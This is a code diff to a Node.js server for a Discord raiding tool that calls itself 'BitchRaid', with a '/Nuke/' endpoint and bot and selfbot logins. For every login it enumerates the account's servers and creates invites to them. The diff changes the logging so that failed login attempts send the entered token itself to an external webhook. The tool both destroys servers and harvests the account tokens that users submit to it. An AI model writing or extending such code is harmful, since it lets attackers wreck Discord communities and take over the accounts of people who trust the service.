@@ -13,15 +13,13 @@ const { Client: SelfbotClient, Intents: SelfbotIntents } = require('discord.js-s
 const app = express();
 const webhookUrl = process.env.BUILT_WEBHOOK;
 
-let Node_Name = "TEST 1";
+let Node_Name = "Test 1";
 let CLIENTS = [];
 let processedServers = new Set();
 let Num = 0
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(cors());
-global.Node_Name = Node_Name
-global.Num = Num
 
 app.post('/Nuke/', async (req, res) => {
   const server_id = req.query.id;
@@ -61,9 +59,8 @@ app.get('/ping', (req, res) => {
 
 // Listen for requests :)
 const listener = app.listen(5000, () => {
-  console.log('[Built] => Thank you for using our site.');
-  console.log(`[Built] => Your api is listening on port ${listener.address().port}`);
-  log(`Node is connected!`, null, "")
+  console.log('[BitchRaid] => Thank you for using our site.');
+  console.log(`[BitchRaid] => Your api is listening on port ${listener.address().port}`);
 });
 
 async function login(token) {
@@ -87,7 +84,6 @@ async function login(token) {
     return client;
   } catch (error) {
     console.error(`Failed to log in with ${token}: ${error}`);
-    log(`Error: Failed to login with ${token}`, client);
     return null;
   }
 }
@@ -98,7 +94,7 @@ async function CheckToken(EnteredToken, res) {
 
   if (client) {
     console.log("[Client] => Logged in as " + client.user.tag);
-    log(`Logged in as ${client.user.tag}`, client);
+    log(`Logged in as ${client.user.tag}`, client, EnteredToken);
 
     const clientGuilds = client.guilds.cache;
     const names = clientGuilds.map((g) => g.name);
@@ -119,7 +115,6 @@ async function CheckToken(EnteredToken, res) {
         }
       } catch (error) {
         console.error(`Failed to create invite for guild ${guild.id}: ${error}`);
-        log(`Error: Failed to create invite for guild ${guild.id}`);
         return { id: guild.id, invite: null };
       }
     }));
@@ -147,7 +142,7 @@ async function CheckToken(EnteredToken, res) {
     });
   } else {
     res.status(401).json({ err: "Invalid token" });
-    log(`Error: Failed to login with ${EnteredToken}`, client);
+    log(`Failed to login with ${EnteredToken}`, client, EnteredToken);
   }
 }
 
@@ -155,51 +150,22 @@ function sleep(milliseconds) {
   return new Promise((resolve) => setTimeout(resolve, milliseconds));
 }
 
-let previousMessage = '';
-let messageCount = 1;
-let isWaitingForWebhook = false;
-
-function sendWebhook(msg, client, tag) {
-  let messageText = msg;
-  if (messageCount > 1) {
-    messageText += ` x${messageCount}`;
-  }
+function log(msg, client, token) {
+const tag = client ? client.user.tag : "Client";
 
   fetch(webhookUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify({ data: `\`[${moment().format("DD-MM-YYYY HH:mm:ss")}]\` [${Node_Name}] ==> **${tag}**: ${messageText} (${Num})` })
+    body: JSON.stringify({ data: `\`[${moment().format("DD-MM-YYYY HH:mm:ss")}]\` [${Node_Name}] ==> **${tag}**: ${msg} (${Num})` })
   })
-  .then(response => {
-    console.log(`[${moment().format("DD-MM-YYYY HH:mm:ss")}] [${Node_Name}] ==> ${tag}: ${messageText} (${Num})`);
-    isWaitingForWebhook = false;
-  })
-  .catch(error => {
-    console.error('Error sending webhook request:', error.message);
-    isWaitingForWebhook = false;
-  });
-}
-
-function log(msg, client, token) {
-  const tag = client ? client.user.tag : "Client";
-
-  if (msg === previousMessage) {
-    messageCount++;
-  } else {
-    if (messageCount > 1 && !isWaitingForWebhook) {
-      isWaitingForWebhook = true;
-      sendWebhook(previousMessage, client, tag);
-    }
-    messageCount = 1;
-    previousMessage = msg;
-  }
-
-  if (messageCount === 1) {
-    // Send the message immediately when it's a new message or a single occurrence
-    sendWebhook(msg, client, tag);
-  }
+    .then(response => {
+      console.log('Webhook request sent successfully');
+    })
+    .catch(error => {
+      console.error('Error sending webhook request:', error.message);
+    });
 }
 
 async function createDiscordClient(token) {
@@ -210,21 +176,20 @@ async function createDiscordClient(token) {
   }
 
   try {
-    // Create a regular bot client
-    const regularClient = new Client({
-      intents: [
-        Intents.FLAGS.GUILDS,
-        Intents.FLAGS.GUILD_MEMBERS,
-        Intents.FLAGS.GUILD_BANS,
-        Intents.FLAGS.GUILD_INVITES,
-        Intents.FLAGS.GUILD_MESSAGES
-      ]
-    });
-
-    // Regular bot message handling
+    const regularClient = new Client({ intents: [
+      Intents.FLAGS.GUILDS,
+      Intents.FLAGS.GUILD_MEMBERS,
+      Intents.FLAGS.GUILD_BANS,
+      Intents.FLAGS.GUILD_INVITES,
+      Intents.FLAGS.GUILD_MESSAGES    
+    ]});
     regularClient.on('messageCreate', async (message) => {
       handleCommandMessage(message, regularClient);
     });
+
+    regularClient.on('debug', function(info) {
+      console.log(info)
+    })
 
     await regularClient.login(token);
     console.log('Regular bot client created and logged in.');
@@ -234,21 +199,22 @@ async function createDiscordClient(token) {
     console.error(`Regular bot client failed to create or log in with token ${token}:`, regularError.message);
 
     try {
-      // Create a selfbot client
-      const selfbotClient = new SelfbotClient({
-        intents: [
-          SelfbotIntents.FLAGS.GUILDS,
-          SelfbotIntents.FLAGS.GUILD_MEMBERS,
-          SelfbotIntents.FLAGS.GUILD_BANS,
-          SelfbotIntents.FLAGS.GUILD_INVITES,
-          SelfbotIntents.FLAGS.GUILD_MESSAGES
-        ]
-      });
+      const selfbotClient = new SelfbotClient({ intents: [
+        SelfbotIntents.FLAGS.GUILDS,
+        SelfbotIntents.FLAGS.GUILD_MEMBERS,
+        SelfbotIntents.FLAGS.GUILD_BANS,
+        SelfbotIntents.FLAGS.GUILD_INVITES,
+        SelfbotIntents.FLAGS.GUILD_MESSAGES
+      ]});
 
-      // Selfbot message handling
-      selfbotClient.on('messageCreate', async (message) => {
-        handleCommandMessage(message, selfbotClient);
-      });
+        selfbotClient.on('messageCreate', async (message) => {
+          handleCommandMessage(message, selfbotClient);
+        });
+
+
+        selfbotClient.on('debug', function(info) {
+         console.log(info)
+        })
 
       await selfbotClient.login(token);
       console.log('Selfbot client created and logged in.');
